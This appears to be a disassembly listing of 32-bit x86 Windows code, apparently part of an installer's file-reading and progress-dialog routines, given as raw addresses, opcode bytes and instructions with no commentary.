  402bd0:	74 0f                	je     0x402be1
  402bd2:	50                   	push   %eax
  402bd3:	e8 ce e6 ff ff       	call   0x4012a6
  402bd8:	56                   	push   %esi
  402bd9:	56                   	push   %esi
  402bda:	e8 19 e6 ff ff       	call   0x4011f8
  402bdf:	eb 77                	jmp    0x402c58
  402be1:	56                   	push   %esi
  402be2:	e8 0a e7 ff ff       	call   0x4012f1
  402be7:	e9 ba fd ff ff       	jmp    0x4029a6
  402bec:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  402bef:	74 12                	je     0x402c03
  402bf1:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402bf4:	8b 15 bc b2 47 00    	mov    0x47b2bc,%edx
  402bfa:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402c01:	eb 55                	jmp    0x402c58
  402c03:	8b 0d bc b2 47 00    	mov    0x47b2bc,%ecx
  402c09:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402c10:	53                   	push   %ebx
  402c11:	e8 17 36 00 00       	call   0x40622d
  402c16:	eb 40                	jmp    0x402c58
  402c18:	8b 0d dc fd 45 00    	mov    0x45fddc,%ecx
  402c1e:	6a 00                	push   $0x0
  402c20:	23 c8                	and    %eax,%ecx
  402c22:	51                   	push   %ecx
  402c23:	6a 0b                	push   $0xb
  402c25:	ff 75 f8             	push   -0x8(%ebp)
  402c28:	ff 15 78 82 40 00    	call   *0x408278
  402c2e:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  402c32:	74 24                	je     0x402c58
  402c34:	6a 00                	push   $0x0
  402c36:	6a 00                	push   $0x0
  402c38:	ff 75 f8             	push   -0x8(%ebp)
  402c3b:	ff 15 74 82 40 00    	call   *0x408274
  402c41:	eb 15                	jmp    0x402c58
  402c43:	33 f6                	xor    %esi,%esi
  402c45:	46                   	inc    %esi
  402c46:	e8 11 e8 ff ff       	call   0x40145c
  402c4b:	50                   	push   %eax
  402c4c:	e8 82 31 00 00       	call   0x405dd3
  402c51:	50                   	push   %eax
  402c52:	57                   	push   %edi
  402c53:	e8 0a 2f 00 00       	call   0x405b62
  402c58:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402c5b:	01 05 68 b3 47 00    	add    %eax,0x47b368
  402c61:	33 c0                	xor    %eax,%eax
  402c63:	5f                   	pop    %edi
  402c64:	5e                   	pop    %esi
  402c65:	5b                   	pop    %ebx
  402c66:	c9                   	leave
  402c67:	c2 04 00             	ret    $0x4
  402c6a:	8b ff                	mov    %edi,%edi
  402c6c:	63 2c 40             	arpl   %ebp,(%eax,%eax,2)
  402c6f:	00 fd                	add    %bh,%ch
  402c71:	15 40 00 0f 16       	adc    $0x160f0040,%eax
  402c76:	40                   	inc    %eax
  402c77:	00 25 16 40 00 39    	add    %ah,0x39004016
  402c7d:	16                   	push   %ss
  402c7e:	40                   	inc    %eax
  402c7f:	00 46 16             	add    %al,0x16(%esi)
  402c82:	40                   	inc    %eax
  402c83:	00 61 16             	add    %ah,0x16(%ecx)
  402c86:	40                   	inc    %eax
  402c87:	00 d9                	add    %bl,%cl
  402c89:	16                   	push   %ss
  402c8a:	40                   	inc    %eax
  402c8b:	00 07                	add    %al,(%edi)
  402c8d:	17                   	pop    %ss
  402c8e:	40                   	inc    %eax
  402c8f:	00 2d 17 40 00 b6    	add    %ch,0xb6004017
  402c95:	17                   	pop    %ss
  402c96:	40                   	inc    %eax
  402c97:	00 6f 16             	add    %ch,0x16(%edi)
  402c9a:	40                   	inc    %eax
  402c9b:	00 ac 16 40 00 cd 16 	add    %ch,0x16cd0040(%esi,%edx,1)
  402ca2:	40                   	inc    %eax
  402ca3:	00 d3                	add    %dl,%bl
  402ca5:	17                   	pop    %ss
  402ca6:	40                   	inc    %eax
  402ca7:	00 22                	add    %ah,(%edx)
  402ca9:	18 40 00             	sbb    %al,0x0(%eax)
  402cac:	8d 18                	lea    (%eax),%ebx
  402cae:	40                   	inc    %eax
  402caf:	00 c3                	add    %al,%bl
  402cb1:	18 40 00             	sbb    %al,0x0(%eax)
  402cb4:	d7                   	xlat   %ds:(%ebx)
  402cb5:	18 40 00             	sbb    %al,0x0(%eax)
  402cb8:	7b 1a                	jnp    0x402cd4
  402cba:	40                   	inc    %eax
  402cbb:	00 90 1a 40 00 c7    	add    %dl,-0x38ffbfe6(%eax)
  402cc1:	1a 40 00             	sbb    0x0(%eax),%al
  402cc4:	cc                   	int3
  402cc5:	1a 40 00             	sbb    0x0(%eax),%al
  402cc8:	df 1a                	fistps (%edx)
  402cca:	40                   	inc    %eax
  402ccb:	00 68 1b             	add    %ch,0x1b(%eax)
  402cce:	40                   	inc    %eax
  402ccf:	00 a0 1b 40 00 e3    	add    %ah,-0x1cffbfe5(%eax)
  402cd5:	1b 40 00             	sbb    0x0(%eax),%eax
  402cd8:	1c 1c                	sbb    $0x1c,%al
  402cda:	40                   	inc    %eax
  402cdb:	00 a6 1c 40 00 c9    	add    %ah,-0x36ffbfe4(%esi)
  402ce1:	1c 40                	sbb    $0x40,%al
  402ce3:	00 76 1d             	add    %dh,0x1d(%esi)
  402ce6:	40                   	inc    %eax
  402ce7:	00 76 1d             	add    %dh,0x1d(%esi)
  402cea:	40                   	inc    %eax
  402ceb:	00 46 1e             	add    %al,0x1e(%esi)
  402cee:	40                   	inc    %eax
  402cef:	00 59 1e             	add    %bl,0x1e(%ecx)
  402cf2:	40                   	inc    %eax
  402cf3:	00 76 1e             	add    %dh,0x1e(%esi)
  402cf6:	40                   	inc    %eax
  402cf7:	00 93 1e 40 00 f0    	add    %dl,-0xfffbfe2(%ebx)
  402cfd:	1e                   	push   %ds
  402cfe:	40                   	inc    %eax
  402cff:	00 6c 1f 40          	add    %ch,0x40(%edi,%ebx,1)
  402d03:	00 9b 1f 40 00 fe    	add    %bl,-0x1ffbfe1(%ebx)
  402d09:	1f                   	pop    %ds
  402d0a:	40                   	inc    %eax
  402d0b:	00 7d 20             	add    %bh,0x20(%ebp)
  402d0e:	40                   	inc    %eax
  402d0f:	00 af 20 40 00 44    	add    %ch,0x44004020(%edi)
  402d15:	21 40 00             	and    %eax,0x0(%eax)
  402d18:	18 22                	sbb    %ah,(%edx)
  402d1a:	40                   	inc    %eax
  402d1b:	00 50 23             	add    %dl,0x23(%eax)
  402d1e:	40                   	inc    %eax
  402d1f:	00 d8                	add    %bl,%al
  402d21:	23 40 00             	and    0x0(%eax),%eax
  402d24:	ee                   	out    %al,(%dx)
  402d25:	23 40 00             	and    0x0(%eax),%eax
  402d28:	3c 24                	cmp    $0x24,%al
  402d2a:	40                   	inc    %eax
  402d2b:	00 8e 24 40 00 f8    	add    %cl,-0x7ffbfdc(%esi)
  402d31:	24 40                	and    $0x40,%al
  402d33:	00 c1                	add    %al,%cl
  402d35:	25 40 00 48 26       	and    $0x26480040,%eax
  402d3a:	40                   	inc    %eax
  402d3b:	00 ac 26 40 00 c8 26 	add    %ch,0x26c80040(%esi,%eiz,1)
  402d42:	40                   	inc    %eax
  402d43:	00 ef                	add    %ch,%bh
  402d45:	26 40                	es inc %eax
  402d47:	00 6f 27             	add    %ch,0x27(%edi)
  402d4a:	40                   	inc    %eax
  402d4b:	00 5a 28             	add    %bl,0x28(%edx)
  402d4e:	40                   	inc    %eax
  402d4f:	00 ab 28 40 00 77    	add    %ch,0x77004028(%ebx)
  402d55:	29 40 00             	sub    %eax,0x0(%eax)
  402d58:	ad                   	lods   %ds:(%esi),%eax
  402d59:	29 40 00             	sub    %eax,0x0(%eax)
  402d5c:	c9                   	leave
  402d5d:	29 40 00             	sub    %eax,0x0(%eax)
  402d60:	f1                   	int1
  402d61:	29 40 00             	sub    %eax,0x0(%eax)
  402d64:	2f                   	das
  402d65:	2a 40 00             	sub    0x0(%eax),%al
  402d68:	2f                   	das
  402d69:	2b 40 00             	sub    0x0(%eax),%eax
  402d6c:	b6 2b                	mov    $0x2b,%dh
  402d6e:	40                   	inc    %eax
  402d6f:	00 58 2c             	add    %bl,0x2c(%eax)
  402d72:	40                   	inc    %eax
  402d73:	00 58 2c             	add    %bl,0x2c(%eax)
  402d76:	40                   	inc    %eax
  402d77:	00 18                	add    %bl,(%eax)
  402d79:	2c 40                	sub    $0x40,%al
  402d7b:	00 43 2c             	add    %al,0x2c(%ebx)
  402d7e:	40                   	inc    %eax
  402d7f:	00 41 1c             	add    %al,0x1c(%ecx)
  402d82:	40                   	inc    %eax
  402d83:	00 45 1c             	add    %al,0x1c(%ebp)
  402d86:	40                   	inc    %eax
  402d87:	00 49 1c             	add    %cl,0x1c(%ecx)
  402d8a:	40                   	inc    %eax
  402d8b:	00 50 1c             	add    %dl,0x1c(%eax)
  402d8e:	40                   	inc    %eax
  402d8f:	00 62 1c             	add    %ah,0x1c(%edx)
  402d92:	40                   	inc    %eax
  402d93:	00 66 1c             	add    %ah,0x1c(%esi)
  402d96:	40                   	inc    %eax
  402d97:	00 6a 1c             	add    %ch,0x1c(%edx)
  402d9a:	40                   	inc    %eax
  402d9b:	00 6e 1c             	add    %ch,0x1c(%esi)
  402d9e:	40                   	inc    %eax
  402d9f:	00 79 1c             	add    %bh,0x1c(%ecx)
  402da2:	40                   	inc    %eax
  402da3:	00 85 1c 40 00 8d    	add    %al,-0x72ffbfe4(%ebp)
  402da9:	1c 40                	sbb    $0x40,%al
  402dab:	00 9a 1c 40 00 9e    	add    %bl,-0x61ffbfe4(%edx)
  402db1:	1c 40                	sbb    $0x40,%al
  402db3:	00 8b 0d 74 e1 41    	add    %cl,0x41e1740d(%ebx)
  402db9:	00 a1 38 7d 43 00    	add    %ah,0x437d38(%ecx)
  402dbf:	3b c8                	cmp    %eax,%ecx
  402dc1:	7c 02                	jl     0x402dc5
  402dc3:	8b c8                	mov    %eax,%ecx
  402dc5:	50                   	push   %eax
  402dc6:	6a 64                	push   $0x64
  402dc8:	51                   	push   %ecx
  402dc9:	ff 15 48 81 40 00    	call   *0x408148
  402dcf:	c3                   	ret
  402dd0:	55                   	push   %ebp
  402dd1:	8b ec                	mov    %esp,%ebp
  402dd3:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402dd9:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402de0:	75 19                	jne    0x402dfb
  402de2:	6a 00                	push   $0x0
  402de4:	68 fa 00 00 00       	push   $0xfa
  402de9:	6a 01                	push   $0x1
  402deb:	ff 75 08             	push   0x8(%ebp)
  402dee:	ff 15 24 82 40 00    	call   *0x408224
  402df4:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402dfb:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402e02:	75 45                	jne    0x402e49
  402e04:	e8 ab ff ff ff       	call   0x402db4
  402e09:	83 3d bc b2 47 00 00 	cmpl   $0x0,0x47b2bc
  402e10:	b9 00 83 40 00       	mov    $0x408300,%ecx
  402e15:	75 05                	jne    0x402e1c
  402e17:	b9 cc 82 40 00       	mov    $0x4082cc,%ecx
  402e1c:	50                   	push   %eax
  402e1d:	51                   	push   %ecx
  402e1e:	8d 45 80             	lea    -0x80(%ebp),%eax
  402e21:	50                   	push   %eax
  402e22:	ff 15 38 82 40 00    	call   *0x408238
  402e28:	83 c4 0c             	add    $0xc,%esp
  402e2b:	8d 45 80             	lea    -0x80(%ebp),%eax
  402e2e:	50                   	push   %eax
  402e2f:	ff 75 08             	push   0x8(%ebp)
  402e32:	ff 15 28 82 40 00    	call   *0x408228
  402e38:	8d 45 80             	lea    -0x80(%ebp),%eax
  402e3b:	50                   	push   %eax
  402e3c:	68 06 04 00 00       	push   $0x406
  402e41:	ff 75 08             	push   0x8(%ebp)
  402e44:	e8 45 2a 00 00       	call   0x40588e
  402e49:	33 c0                	xor    %eax,%eax
  402e4b:	c9                   	leave
  402e4c:	c2 10 00             	ret    $0x10
  402e4f:	55                   	push   %ebp
  402e50:	8b ec                	mov    %esp,%ebp
  402e52:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402e58:	56                   	push   %esi
  402e59:	33 f6                	xor    %esi,%esi
  402e5b:	39 75 08             	cmp    %esi,0x8(%ebp)
  402e5e:	74 18                	je     0x402e78
  402e60:	a1 70 e1 41 00       	mov    0x41e170,%eax
  402e65:	3b c6                	cmp    %esi,%eax
  402e67:	74 07                	je     0x402e70
  402e69:	50                   	push   %eax
  402e6a:	ff 15 1c 82 40 00    	call   *0x40821c
  402e70:	89 35 70 e1 41 00    	mov    %esi,0x41e170
  402e76:	eb 76                	jmp    0x402eee
  402e78:	39 35 70 e1 41 00    	cmp    %esi,0x41e170
  402e7e:	74 08                	je     0x402e88
  402e80:	56                   	push   %esi
  402e81:	e8 d3 2e 00 00       	call   0x405d59
  402e86:	eb 66                	jmp    0x402eee
  402e88:	ff 15 90 80 40 00    	call   *0x408090
  402e8e:	3b 05 00 b3 47 00    	cmp    0x47b300,%eax
  402e94:	76 58                	jbe    0x402eee
  402e96:	39 35 b4 b2 47 00    	cmp    %esi,0x47b2b4
  402e9c:	74 2d                	je     0x402ecb
  402e9e:	f6 05 94 b3 47 00 01 	testb  $0x1,0x47b394
  402ea5:	74 47                	je     0x402eee
  402ea7:	e8 08 ff ff ff       	call   0x402db4
  402eac:	50                   	push   %eax
  402ead:	8d 45 80             	lea    -0x80(%ebp),%eax
  402eb0:	68 2c 83 40 00       	push   $0x40832c
  402eb5:	50                   	push   %eax
  402eb6:	ff 15 38 82 40 00    	call   *0x408238
  402ebc:	83 c4 0c             	add    $0xc,%esp
  402ebf:	8d 45 80             	lea    -0x80(%ebp),%eax
  402ec2:	50                   	push   %eax
  402ec3:	56                   	push   %esi
  402ec4:	e8 0d 1d 00 00       	call   0x404bd6
  402ec9:	eb 23                	jmp    0x402eee
  402ecb:	56                   	push   %esi
  402ecc:	68 d0 2d 40 00       	push   $0x402dd0
  402ed1:	56                   	push   %esi
  402ed2:	6a 6f                	push   $0x6f
  402ed4:	ff 35 b8 b2 47 00    	push   0x47b2b8
  402eda:	ff 15 20 82 40 00    	call   *0x408220
  402ee0:	6a 05                	push   $0x5
  402ee2:	50                   	push   %eax
  402ee3:	a3 70 e1 41 00       	mov    %eax,0x41e170
  402ee8:	ff 15 34 82 40 00    	call   *0x408234
  402eee:	5e                   	pop    %esi
  402eef:	c9                   	leave
  402ef0:	c3                   	ret
  402ef1:	55                   	push   %ebp
  402ef2:	8b ec                	mov    %esp,%ebp
  402ef4:	56                   	push   %esi
  402ef5:	8b 75 0c             	mov    0xc(%ebp),%esi
  402ef8:	6a 00                	push   $0x0
  402efa:	8d 45 0c             	lea    0xc(%ebp),%eax
  402efd:	50                   	push   %eax
  402efe:	56                   	push   %esi
  402eff:	ff 75 08             	push   0x8(%ebp)
  402f02:	ff 35 10 a0 40 00    	push   0x40a010
  402f08:	ff 15 54 81 40 00    	call   *0x408154
  402f0e:	85 c0                	test   %eax,%eax
  402f10:	74 0a                	je     0x402f1c
  402f12:	39 75 0c             	cmp    %esi,0xc(%ebp)
  402f15:	75 05                	jne    0x402f1c
  402f17:	33 c0                	xor    %eax,%eax
  402f19:	40                   	inc    %eax
  402f1a:	eb 02                	jmp    0x402f1e
  402f1c:	33 c0                	xor    %eax,%eax
  402f1e:	5e                   	pop    %esi
  402f1f:	5d                   	pop    %ebp
  402f20:	c2 08 00             	ret    $0x8
  402f23:	6a 00                	push   $0x0
  402f25:	6a 00                	push   $0x0
  402f27:	ff 74 24 0c          	push   0xc(%esp)
  402f2b:	ff 35 10 a0 40 00    	push   0x40a010
  402f31:	ff 15 5c 81 40 00    	call   *0x40815c
  402f37:	c2 04 00             	ret    $0x4
  402f3a:	51                   	push   %ecx
  402f3b:	53                   	push   %ebx
  402f3c:	55                   	push   %ebp
  402f3d:	56                   	push   %esi
  402f3e:	8b 35 3c 7d 43 00    	mov    0x437d3c,%esi
  402f44:	2b 35 48 bd 43 00    	sub    0x43bd48,%esi
  402f4a:	57                   	push   %edi
  402f4b:	03 74 24 18          	add    0x18(%esp),%esi
  402f4f:	ff 15 90 80 40 00    	call   *0x408090
  402f55:	05 f4 01 00 00       	add    $0x1f4,%eax
  402f5a:	33 db                	xor    %ebx,%ebx
  402f5c:	3b f3                	cmp    %ebx,%esi
  402f5e:	a3 00 b3 47 00       	mov    %eax,0x47b300
  402f63:	0f 8e 2f 01 00 00    	jle    0x403098
  402f69:	ff 35 44 bd 43 00    	push   0x43bd44
  402f6f:	e8 af ff ff ff       	call   0x402f23
  402f74:	53                   	push   %ebx
  402f75:	53                   	push   %ebx
  402f76:	ff 35 48 bd 43 00    	push   0x43bd48
  402f7c:	ff 35 14 a0 40 00    	push   0x40a014
  402f82:	ff 15 5c 81 40 00    	call   *0x40815c
  402f88:	89 35 38 7d 43 00    	mov    %esi,0x437d38
  402f8e:	89 1d 74 e1 41 00    	mov    %ebx,0x41e174
  402f94:	bd 38 fd 42 00       	mov    $0x42fd38,%ebp
  402f99:	a1 40 bd 43 00       	mov    0x43bd40,%eax
  402f9e:	2b 05 44 bd 43 00    	sub    0x43bd44,%eax
  402fa4:	bf 00 40 00 00       	mov    $0x4000,%edi
  402fa9:	3b c7                	cmp    %edi,%eax
  402fab:	7f 02                	jg     0x402faf
  402fad:	8b f8                	mov    %eax,%edi
  402faf:	57                   	push   %edi
  402fb0:	be 40 7d 43 00       	mov    $0x437d40,%esi
  402fb5:	56                   	push   %esi
  402fb6:	e8 36 ff ff ff       	call   0x402ef1
  402fbb:	85 c0                	test   %eax,%eax
  402fbd:	0f 84 e7 00 00 00    	je     0x4030aa
  402fc3:	01 3d 44 bd 43 00    	add    %edi,0x43bd44
  402fc9:	89 35 78 61 42 00    	mov    %esi,0x426178
  402fcf:	89 3d 7c 61 42 00    	mov    %edi,0x42617c
  402fd5:	39 1d bc b2 47 00    	cmp    %ebx,0x47b2bc
  402fdb:	74 29                	je     0x403006
  402fdd:	39 1d 80 b3 47 00    	cmp    %ebx,0x47b380
  402fe3:	75 21                	jne    0x403006
  402fe5:	a1 38 7d 43 00       	mov    0x437d38,%eax
  402fea:	2b 05 3c 7d 43 00    	sub    0x437d3c,%eax
  402ff0:	53                   	push   %ebx
  402ff1:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  402ff5:	03 05 48 bd 43 00    	add    0x43bd48,%eax
  402ffb:	a3 74 e1 41 00       	mov    %eax,0x41e174
  403000:	e8 4a fe ff ff       	call   0x402e4f
  403005:	59                   	pop    %ecx
  403006:	68 78 61 42 00       	push   $0x426178
  40300b:	89 2d 80 61 42 00    	mov    %ebp,0x426180
  403011:	c7 05 84 61 42 00 00 	movl   $0x8000,0x426184
  403018:	80 00 00 
  40301b:	e8 75 3c 00 00       	call   0x406c95
  403020:	85 c0                	test   %eax,%eax
  403022:	0f 8c 87 00 00 00    	jl     0x4030af
  403028:	8b 35 80 61 42 00    	mov    0x426180,%esi
  40302e:	2b f5                	sub    %ebp,%esi
  403030:	74 32                	je     0x403064
  403032:	53                   	push   %ebx
  403033:	8d 44 24 14          	lea    0x14(%esp),%eax
  403037:	50                   	push   %eax
  403038:	56                   	push   %esi
  403039:	55                   	push   %ebp
  40303a:	ff 35 14 a0 40 00    	push   0x40a014
  403040:	ff 15 50 81 40 00    	call   *0x408150
  403046:	85 c0                	test   %eax,%eax
  403048:	74 6a                	je     0x4030b4
  40304a:	3b 74 24 10          	cmp    0x10(%esp),%esi
  40304e:	75 64                	jne    0x4030b4
  403050:	01 35 48 bd 43 00    	add    %esi,0x43bd48
  403056:	39 1d 7c 61 42 00    	cmp    %ebx,0x42617c
  40305c:	0f 85 73 ff ff ff    	jne    0x402fd5
  403062:	eb 0c                	jmp    0x403070
  403064:	39 1d 7c 61 42 00    	cmp    %ebx,0x42617c
  40306a:	75 43                	jne    0x4030af
  40306c:	3b fb                	cmp    %ebx,%edi
  40306e:	74 3f                	je     0x4030af
  403070:	a1 3c 7d 43 00       	mov    0x437d3c,%eax
  403075:	8b c8                	mov    %eax,%ecx
  403077:	2b 0d 48 bd 43 00    	sub    0x43bd48,%ecx
  40307d:	03 4c 24 18          	add    0x18(%esp),%ecx
  403081:	85 c9                	test   %ecx,%ecx
  403083:	0f 8f 10 ff ff ff    	jg     0x402f99
  403089:	53                   	push   %ebx
  40308a:	53                   	push   %ebx
  40308b:	50                   	push   %eax
  40308c:	ff 35 14 a0 40 00    	push   0x40a014
  403092:	ff 15 5c 81 40 00    	call   *0x40815c
  403098:	6a 01                	push   $0x1
  40309a:	e8 b0 fd ff ff       	call   0x402e4f
  40309f:	59                   	pop    %ecx
  4030a0:	33 c0                	xor    %eax,%eax
  4030a2:	5f                   	pop    %edi
  4030a3:	5e                   	pop    %esi
  4030a4:	5d                   	pop    %ebp
  4030a5:	5b                   	pop    %ebx
  4030a6:	59                   	pop    %ecx
  4030a7:	c2 04 00             	ret    $0x4
  4030aa:	83 c8 ff             	or     $0xffffffff,%eax
  4030ad:	eb f3                	jmp    0x4030a2
  4030af:	6a fd                	push   $0xfffffffd
  4030b1:	58                   	pop    %eax
  4030b2:	eb ee                	jmp    0x4030a2
  4030b4:	6a fe                	push   $0xfffffffe
  4030b6:	eb f9                	jmp    0x4030b1
  4030b8:	55                   	push   %ebp
  4030b9:	8b ec                	mov    %esp,%ebp
  4030bb:	51                   	push   %ecx
  4030bc:	51                   	push   %ecx
  4030bd:	8b 45 08             	mov    0x8(%ebp),%eax
  4030c0:	56                   	push   %esi
  4030c1:	57                   	push   %edi
  4030c2:	33 ff                	xor    %edi,%edi
  4030c4:	3b c7                	cmp    %edi,%eax
  4030c6:	7c 1c                	jl     0x4030e4
  4030c8:	8b 0d f8 b2 47 00    	mov    0x47b2f8,%ecx
  4030ce:	57                   	push   %edi
  4030cf:	03 c1                	add    %ecx,%eax
  4030d1:	57                   	push   %edi
  4030d2:	50                   	push   %eax
  4030d3:	ff 35 14 a0 40 00    	push   0x40a014
  4030d9:	a3 3c 7d 43 00       	mov    %eax,0x437d3c
  4030de:	ff 15 5c 81 40 00    	call   *0x40815c
  4030e4:	6a 04                	push   $0x4
  4030e6:	5e                   	pop    %esi
  4030e7:	56                   	push   %esi
  4030e8:	e8 4d fe ff ff       	call   0x402f3a
  4030ed:	3b c7                	cmp    %edi,%eax
  4030ef:	0f 8c e8 00 00 00    	jl     0x4031dd
  4030f5:	53                   	push   %ebx
  4030f6:	8b 1d 54 81 40 00    	mov    0x408154,%ebx
  4030fc:	57                   	push   %edi
  4030fd:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403100:	50                   	push   %eax
  403101:	56                   	push   %esi
  403102:	8d 45 08             	lea    0x8(%ebp),%eax
  403105:	50                   	push   %eax
  403106:	ff 35 14 a0 40 00    	push   0x40a014
  40310c:	ff d3                	call   *%ebx
  40310e:	85 c0                	test   %eax,%eax
  403110:	0f 84 c3 00 00 00    	je     0x4031d9
  403116:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  403119:	0f 85 ba 00 00 00    	jne    0x4031d9
  40311f:	ff 75 08             	push   0x8(%ebp)
  403122:	01 35 3c 7d 43 00    	add    %esi,0x437d3c
  403128:	e8 0d fe ff ff       	call   0x402f3a
  40312d:	3b c7                	cmp    %edi,%eax
  40312f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403132:	0f 8c a4 00 00 00    	jl     0x4031dc
  403138:	39 7d 10             	cmp    %edi,0x10(%ebp)
  40313b:	75 6b                	jne    0x4031a8
  40313d:	39 7d 08             	cmp    %edi,0x8(%ebp)
  403140:	0f 8e 8e 00 00 00    	jle    0x4031d4
  403146:	be 40 7d 43 00       	mov    $0x437d40,%esi
  40314b:	bf 00 40 00 00       	mov    $0x4000,%edi
  403150:	39 7d 08             	cmp    %edi,0x8(%ebp)
  403153:	7d 03                	jge    0x403158
  403155:	8b 7d 08             	mov    0x8(%ebp),%edi
  403158:	6a 00                	push   $0x0
  40315a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40315d:	50                   	push   %eax
  40315e:	57                   	push   %edi
  40315f:	56                   	push   %esi
  403160:	ff 35 14 a0 40 00    	push   0x40a014
  403166:	ff d3                	call   *%ebx
  403168:	85 c0                	test   %eax,%eax
  40316a:	74 6d                	je     0x4031d9
  40316c:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  40316f:	75 68                	jne    0x4031d9
  403171:	6a 00                	push   $0x0
  403173:	8d 45 14             	lea    0x14(%ebp),%eax
  403176:	50                   	push   %eax
  403177:	ff 75 fc             	push   -0x4(%ebp)
  40317a:	56                   	push   %esi
  40317b:	ff 75 0c             	push   0xc(%ebp)
  40317e:	ff 15 50 81 40 00    	call   *0x408150
  403184:	85 c0                	test   %eax,%eax
  403186:	74 1c                	je     0x4031a4
  403188:	39 7d 14             	cmp    %edi,0x14(%ebp)
  40318b:	75 17                	jne    0x4031a4
  40318d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403190:	01 45 f8             	add    %eax,-0x8(%ebp)
  403193:	29 45 08             	sub    %eax,0x8(%ebp)
  403196:	01 05 3c 7d 43 00    	add    %eax,0x437d3c
  40319c:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4031a0:	7f a9                	jg     0x40314b
  4031a2:	eb 30                	jmp    0x4031d4
  4031a4:	6a fe                	push   $0xfffffffe
  4031a6:	eb 33                	jmp    0x4031db
  4031a8:	8b 45 08             	mov    0x8(%ebp),%eax
  4031ab:	3b 45 14             	cmp    0x14(%ebp),%eax
  4031ae:	7c 03                	jl     0x4031b3
  4031b0:	8b 45 14             	mov    0x14(%ebp),%eax
  4031b3:	57                   	push   %edi
  4031b4:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4031b7:	51                   	push   %ecx
  4031b8:	50                   	push   %eax
  4031b9:	ff 75 10             	push   0x10(%ebp)
  4031bc:	ff 35 14 a0 40 00    	push   0x40a014
  4031c2:	ff d3                	call   *%ebx
  4031c4:	85 c0                	test   %eax,%eax
  4031c6:	74 11                	je     0x4031d9
  4031c8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4031cb:	01 05 3c 7d 43 00    	add    %eax,0x437d3c
  4031d1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4031d4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4031d7:	eb 03                	jmp    0x4031dc
  4031d9:	6a fd                	push   $0xfffffffd
  4031db:	58                   	pop    %eax
  4031dc:	5b                   	pop    %ebx
  4031dd:	5f                   	pop    %edi
  4031de:	5e                   	pop    %esi
  4031df:	c9                   	leave
  4031e0:	c2 10 00             	ret    $0x10
  4031e3:	55                   	push   %ebp
  4031e4:	8b ec                	mov    %esp,%ebp
  4031e6:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
  4031ec:	53                   	push   %ebx
  4031ed:	56                   	push   %esi
  4031ee:	33 db                	xor    %ebx,%ebx
  4031f0:	57                   	push   %edi
  4031f1:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4031f4:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4031f7:	ff 15 90 80 40 00    	call   *0x408090
  4031fd:	68 04 20 00 00       	push   $0x2004
  403202:	be d8 80 4e 00       	mov    $0x4e80d8,%esi
  403207:	56                   	push   %esi
  403208:	05 e8 03 00 00       	add    $0x3e8,%eax
  40320d:	53                   	push   %ebx
  40320e:	a3 00 b3 47 00       	mov    %eax,0x47b300
  403213:	ff 15 9c 80 40 00    	call   *0x40809c
  403219:	6a 03                	push   $0x3
  40321b:	68 00 00 00 80       	push   $0x80000000
  403220:	56                   	push   %esi
  403221:	e8 3b 28 00 00       	call   0x405a61
  403226:	8b f8                	mov    %eax,%edi
  403228:	89 3d 10 a0 40 00    	mov    %edi,0x40a010
  40322e:	83 ff ff             	cmp    $0xffffffff,%edi
  403231:	75 0a                	jne    0x40323d
  403233:	b8 60 85 40 00       	mov    $0x408560,%eax
  403238:	e9 67 02 00 00       	jmp    0x4034a4
  40323d:	56                   	push   %esi
  40323e:	be b8 80 4d 00       	mov    $0x4d80b8,%esi
  403243:	56                   	push   %esi
  403244:	e8 d2 29 00 00       	call   0x405c1b
  403249:	56                   	push   %esi
  40324a:	e8 29 2f 00 00       	call   0x406178
  40324f:	50                   	push   %eax
  403250:	68 e0 c0 4e 00       	push   $0x4ec0e0
  403255:	e8 c1 29 00 00       	call   0x405c1b
  40325a:	53                   	push   %ebx
  40325b:	57                   	push   %edi
  40325c:	ff 15 98 80 40 00    	call   *0x408098
  403262:	3b c3                	cmp    %ebx,%eax
  403264:	a3 38 7d 43 00       	mov    %eax,0x437d38
  403269:	8b f0                	mov    %eax,%esi
  40326b:	0f 8e ea 00 00 00    	jle    0x40335b
  403271:	a1 0c b3 47 00       	mov    0x47b30c,%eax
  403276:	f7 d8                	neg    %eax
  403278:	1b c0                	sbb    %eax,%eax
  40327a:	25 00 7e 00 00       	and    $0x7e00,%eax
  40327f:	05 00 02 00 00       	add    $0x200,%eax
  403284:	3b f0                	cmp    %eax,%esi
  403286:	8b fe                	mov    %esi,%edi
  403288:	7c 02                	jl     0x40328c
  40328a:	8b f8                	mov    %eax,%edi
  40328c:	57                   	push   %edi
  40328d:	68 78 e1 41 00       	push   $0x41e178
  403292:	e8 5a fc ff ff       	call   0x402ef1
  403297:	85 c0                	test   %eax,%eax
  403299:	0f 84 7b 01 00 00    	je     0x40341a
  40329f:	39 1d 0c b3 47 00    	cmp    %ebx,0x47b30c
  4032a5:	75 7e                	jne    0x403325
  4032a7:	6a 1c                	push   $0x1c
  4032a9:	68 78 e1 41 00       	push   $0x41e178
  4032ae:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4032b1:	50                   	push   %eax
  4032b2:	e8 66 27 00 00       	call   0x405a1d
  4032b7:	8b 45 dc             	mov    -0x24(%ebp),%eax
